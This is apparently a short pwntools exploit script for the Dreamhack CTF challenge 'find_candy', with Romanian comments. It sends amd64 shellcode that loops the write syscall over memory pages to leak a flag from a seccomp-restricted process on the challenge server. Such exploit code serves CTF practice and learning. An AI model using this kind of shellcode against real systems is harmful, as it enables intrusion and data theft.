from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/findcandy/deploy/find_candy')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:19042'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
   
#avem write si arch_prctl doar
#read(fd, buf, 0x500u)
#se citest din fd in buf, buf fiind addr aia random peste 0x80045ffa000
#stim sigur ca flag o sa fie la 0x80000000000 + x(mare)
#nr sub xffffffff

#all regs are emptied
#avem doar write practic; write error da crash?

#write to stdout

sh = asm('''
mov rsi, 0x80000000000

mov rdi, 1
add rsi, 0x1000
mov rdx, 0x1000

mov rax, 1
syscall

cmp rax, -14
je $-34
''')


p.recvuntil(b": ")
p.send(sh)
 

p.interactive()
